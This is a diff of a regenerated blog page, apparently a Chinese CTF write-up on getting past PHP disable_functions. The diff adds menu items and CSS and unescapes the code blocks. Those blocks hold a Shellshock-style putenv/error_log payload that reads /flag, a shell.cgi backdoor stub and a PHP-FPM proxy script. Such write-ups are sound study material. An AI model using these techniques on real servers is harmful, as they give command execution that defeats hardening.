@@ -82,6 +82,10 @@
       alert('朋友，IE浏览器未适配哦~');
     }
   </script>
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head> 
 </html>
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
@@ -262,6 +266,27 @@
               </li>
             
               <li>
+                <a href="javascript:;">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+                    清单
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/fanju/">
+                          <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                          追剧
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
                 <a href="/links/">
                   <span class="faa-parent animated-hover">
                     <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
@@ -395,10 +420,10 @@
 </blockquote>
 <p>脚本</p>
 <pre><code class="php">&lt;?php
-$cmd = &quot; tac /flag&gt;/var/www/html/1.txt&quot;;
-putenv(&quot;PHP_DMIND=() { :; };$cmd&quot;);
-error_log(&quot;dmind&quot;,1); 
-echo file_get_contents(&quot;/var/www/html/1.txt&quot;);
+$cmd = " tac /flag&gt;/var/www/html/1.txt";
+putenv("PHP_DMIND=() { :; };$cmd");
+error_log("dmind",1); 
+echo file_get_contents("/var/www/html/1.txt");
 ?&gt;
 </code></pre>
 <p>用蚁剑传进去后<br>浏览器访问这个文件即可在1.txt看到flag<br><img src="https://img-blog.csdnimg.cn/3d91c09a976d423dac82102531093e0c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
@@ -420,7 +445,7 @@ AddHandler cgi-script .cgi
 </code></pre>
 <p>shell.cgi</p>
 <pre><code class="shell">#!/bin/sh
-echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b
+echo&amp;&amp;cd "/var/www/html/backdoor";cat shell.cgi;echo 96642;pwd;echo c26b314f4b
 </code></pre>
 <h2 id="简单方法："><a href="#简单方法：" class="headerlink" title="简单方法："></a>简单方法：</h2><p>蚁剑连<br>还是那个插件bypass！<br><img src="https://img-blog.csdnimg.cn/62979eb3a1e84ce580aad7229184b420.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
 <h1 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h1><ol>
@@ -433,13 +458,13 @@ echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd
 function get_client_header(){
     $headers=array();
     foreach($_SERVER as $k=&gt;$v){
-        if(strpos($k,&#39;HTTP_&#39;)===0){
-            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
-            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
-            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
-            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
-            if($k==&#39;Host&#39;) continue;
-            $headers[]=&quot;$k:$v&quot;;
+        if(strpos($k,'HTTP_')===0){
+            $k=strtolower(preg_replace('/^HTTP/', '', $k));
+            $k=preg_replace_callback('/_\w/','header_callback',$k);
+            $k=preg_replace('/^_/','',$k);
+            $k=str_replace('_','-',$k);
+            if($k=='Host') continue;
+            $headers[]="$k:$v";
         }
     }
     return $headers;
@@ -448,51 +473,51 @@ function header_callback($str){
     return strtoupper($str[0]);
 }
 function parseHeader($sResponse){
-    list($headerstr,$sResponse)=explode(&quot;
-&quot;,$sResponse, 2);
+    list($headerstr,$sResponse)=explode("
+",$sResponse, 2);
     $ret=array($headerstr,$sResponse);
-    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
+    if(preg_match('/^HTTP/1.1 d{3}/', $sResponse)){
         $ret=parseHeader($sResponse);
     }
     return $ret;
 }
 set_time_limit(120);
 $headers=get_client_header();
-$host = &quot;127.0.0.1&quot;;
+$host = "127.0.0.1";
 $port = 61921;
-$errno = &#39;&#39;;
-$errstr = &#39;&#39;;
+$errno = '';
+$errstr = '';
 $timeout = 30;
-$url = &quot;/index.php&quot;;
-if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
-    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
+$url = "/index.php";
+if (!empty($_SERVER['QUERY_STRING'])){
+    $url .= "?".$_SERVER['QUERY_STRING'];
 };
 $fp = fsockopen($host, $port, $errno, $errstr, $timeout);
 if(!$fp){
     return false;
 }
-$method = &quot;GET&quot;;
-$post_data = &quot;&quot;;
-if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
-    $method = &quot;POST&quot;;
-    $post_data = file_get_contents(&#39;php://input&#39;);
+$method = "GET";
+$post_data = "";
+if($_SERVER['REQUEST_METHOD']=='POST') {
+    $method = "POST";
+    $post_data = file_get_contents('php://input');
 }
-$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
-$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
-if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
-    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
+$out = $method." ".$url." HTTP/1.1\r\n";
+$out .= "Host: ".$host.":".$port."\r\n";
+if (!empty($_SERVER['CONTENT_TYPE'])) {
+    $out .= "Content-Type: ".$_SERVER['CONTENT_TYPE']."\r\n";
 }
-$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
-$out .= implode(&quot;\r\n&quot;,$headers);
-$out .= &quot;\r\n\r\n&quot;;
-$out .= &quot;&quot;.$post_data;
+$out .= "Content-length:".strlen($post_data)."\r\n";
+$out .= implode("\r\n",$headers);
+$out .= "\r\n\r\n";
+$out .= "".$post_data;
 fputs($fp, $out);
-$response = &#39;&#39;;
+$response = '';
 while($row=fread($fp, 4096)){
     $response .= $row;
 }
 fclose($fp);
-$pos = strpos($response, &quot;\r\n\r\n&quot;);
+$pos = strpos($response, "\r\n\r\n");
 $response = substr($response, $pos+4);
 echo $response;
 </code></pre>
@@ -520,13 +545,13 @@ echo $response;
 function get_client_header(){
     $headers=array();
     foreach($_SERVER as $k=&gt;$v){
-        if(strpos($k,&#39;HTTP_&#39;)===0){
-            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
-            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
-            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
-            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
-            if($k==&#39;Host&#39;) continue;
-            $headers[]=&quot;$k:$v&quot;;
+        if(strpos($k,'HTTP_')===0){
+            $k=strtolower(preg_replace('/^HTTP/', '', $k));
+            $k=preg_replace_callback('/_\w/','header_callback',$k);
+            $k=preg_replace('/^_/','',$k);
+            $k=str_replace('_','-',$k);
+            if($k=='Host') continue;
+            $headers[]="$k:$v";
         }
     }
     return $headers;
@@ -535,51 +560,51 @@ function header_callback($str){
     return strtoupper($str[0]);
 }
 function parseHeader($sResponse){
-    list($headerstr,$sResponse)=explode(&quot;
-&quot;,$sResponse, 2);
+    list($headerstr,$sResponse)=explode("
+",$sResponse, 2);
     $ret=array($headerstr,$sResponse);
-    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
+    if(preg_match('/^HTTP/1.1 d{3}/', $sResponse)){
         $ret=parseHeader($sResponse);
     }
     return $ret;
 }
 set_time_limit(120);
 $headers=get_client_header();
-$host = &quot;127.0.0.1&quot;;
+$host = "127.0.0.1";
 $port = 63947;
-$errno = &#39;&#39;;
-$errstr = &#39;&#39;;
+$errno = '';
+$errstr = '';
 $timeout = 30;
-$url = &quot;/index.php&quot;;
-if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
-    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
+$url = "/index.php";
+if (!empty($_SERVER['QUERY_STRING'])){
+    $url .= "?".$_SERVER['QUERY_STRING'];
 };
 $fp = fsockopen($host, $port, $errno, $errstr, $timeout);
 if(!$fp){
     return false;
 }
-$method = &quot;GET&quot;;
-$post_data = &quot;&quot;;
-if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
-    $method = &quot;POST&quot;;
-    $post_data = file_get_contents(&#39;php://input&#39;);
+$method = "GET";
+$post_data = "";
+if($_SERVER['REQUEST_METHOD']=='POST') {
+    $method = "POST";
+    $post_data = file_get_contents('php://input');
 }
-$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
-$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
-if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
-    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
+$out = $method." ".$url." HTTP/1.1\r\n";
+$out .= "Host: ".$host.":".$port."\r\n";
+if (!empty($_SERVER['CONTENT_TYPE'])) {
+    $out .= "Content-Type: ".$_SERVER['CONTENT_TYPE']."\r\n";
 }
-$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
-$out .= implode(&quot;\r\n&quot;,$headers);
-$out .= &quot;\r\n\r\n&quot;;
-$out .= &quot;&quot;.$post_data;
+$out .= "Content-length:".strlen($post_data)."\r\n";
+$out .= implode("\r\n",$headers);
+$out .= "\r\n\r\n";
+$out .= "".$post_data;
 fputs($fp, $out);
-$response = &#39;&#39;;
+$response = '';
 while($row=fread($fp, 4096)){
     $response .= $row;
 }
 fclose($fp);
-$pos = strpos($response, &quot;\r\n\r\n&quot;);
+$pos = strpos($response, "\r\n\r\n");
 $response = substr($response, $pos+4);
 echo $response;
 </code></pre>
@@ -968,6 +993,27 @@ gitalk.render('gitalk-container')
                 <a href="/categories/资源/">
                   <i class="fa fa-cloud-download" aria-hidden="true"></i>
                   资源
+                </a>
+              </li>
+            
+          </ul>
+        
+      </li>
+    
+      <li>
+        <a href="javascript:;">
+          <span class="faa-parent animated-hover">
+            <i class="fa  fa-list-ul faa-vertical" aria-hidden="true"></i>
+            清单
+          </span>
+        </a>
+        
+          <ul class="sub-menu">
+            
+              <li>
+                <a href="/fanju/">
+                  <i class="fa fa-film faa-vertical" aria-hidden="true"></i>
+                  追剧
                 </a>
               </li>
             
